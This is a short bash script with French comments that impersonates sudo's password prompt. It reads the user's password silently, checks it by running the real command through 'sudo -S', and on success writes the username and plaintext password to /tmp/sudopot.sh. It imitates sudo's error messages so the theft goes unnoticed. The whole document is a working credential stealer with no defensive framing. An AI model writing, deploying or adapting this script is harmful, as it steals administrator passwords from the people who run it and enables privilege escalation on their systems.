#!/bin/bash
i=1;
#string contient la ligne de commande à lancer une fois le mdp récupéré
string="sudo -S "$@;
#3 tentatives de mot de passe
while [ "$i" -lt 4 ]; do 
	#Echo la première ligne de sudo
	echo -n "[sudo] Mot de passe de $USER : "; 
	#Input invisible pour le mot de passe
	stty -echo;	read pass;	stty echo;
	echo "";
	#On exécute la commande authentique
	echo $pass | $string 2> /dev/null;
	#Si la commande est exécutée (I.E : si le mot de passe est correct)
	if [[ $? -eq 0 ]]; then
		#On écrit le nom de l'utilisateur et son mot de passe au bas du script
		echo "#$USER : $pass" >> /tmp/sudopot.sh;	
		break;
	else 
		#Sinon, si le compteur vaut 3 alors on quitte la loop
		if [[ $i -eq 3 ]]; then
			echo "sudo: 3 saisies de mots de passe incorrectes";
			break;
		#Sinon on laisse l'utilisateur réessayer
		else 
			echo "Désolé, essayez de nouveau.";
		fi
	fi
	#On incrémente le compteur
	((i++));
	#On détruit la variable pass (just in case :D)
	unset pass;
done;
#Nom d'utilisateur : mot de passe
